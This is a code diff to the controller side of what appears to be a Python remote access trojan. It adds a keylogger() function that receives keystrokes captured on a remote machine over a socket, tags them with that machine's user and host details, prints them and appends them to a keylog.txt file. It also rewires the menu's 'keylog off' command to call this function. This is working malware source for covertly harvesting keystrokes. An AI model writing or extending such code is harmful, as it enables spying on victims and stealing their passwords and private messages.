@@ -374,6 +374,42 @@ def command_shell():
         else:
             print(strDefault, end='')
 
+def keylogger():
+    # First Receive len of logged keys
+    firstRecv = decode_utf8(recv(intBuff))
+
+    resultLen = intBuff
+    loggedKeys = ''
+
+    if firstRecv.startswith('len'):
+        resultLen = int(firstRecv.split(' ')[1])
+
+        if resultLen == 0:
+            print(f"{fColors.LIGHT_RED}[-] No Keys Logged.")
+            return send_commands()
+        else:
+            # Scond Receive logged keys
+            loggedKeys = decode_utf8(recvall(resultLen))
+
+            # if loggedKeys.startswith('@keys@'):
+            clientInfo = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
+            loggedKeys = loggedKeys.replace('@keys@' , f'Logged Keys from {clientInfo}: \n')
+
+            print(f"{fColors.GREEN}\n[+] Key Logging Stopped. All Logged keys saved into 'keylog.txt' file. "
+                  f"Logged Keys:\n{fColors.LIGHT_WHITE}{loggedKeys}")
+
+    # Write Result to the file
+    with open('keylog.txt', 'a') as f:
+        f.write("\n----------\n\n----------\n" + loggedKeys)
+
+        # Third Receive Key Logoff Message
+        keyLogOff = decode_utf8(recv(intBuff))
+        print(f"{fColors.LIGHT_RED}\n\n {keyLogOff}{fColors.RESET}")
+
+        # for key in loggedKeys:
+        #     f.write(key)
+        #     # f.write(" ".join(key))
+
 
 # Step 19: Define `send_commands()` Function to Send Commands to the Client
 # All Commands except Main Menu Commands should define in this function
@@ -422,20 +458,9 @@ def send_commands():
 
         elif strChoice == '--k 0' or strChoice == 'keylog off':
             send(b'keylogoff')
-
-            # First Receive len of logged keys
-            resultLen = int(decode_utf8(recv(intBuff)))
-            resultLen = int(resultLen)
-
-            # Scond Receive logged keys
-            loggedKeys = decode_utf8(recvall(resultLen))
-
-            print(f"{fColors.GREEN}\n[+] Key Logging Stopped. All Logged keys saved into 'keylog.txt' file. "
-                  f"Logged Keys:\n{fColors.LIGHT_WHITE}{loggedKeys}")
+            keylogger()
 
 
-            with open('keylog.txt', 'w') as f:
-                f.write(loggedKeys)
 
 
 
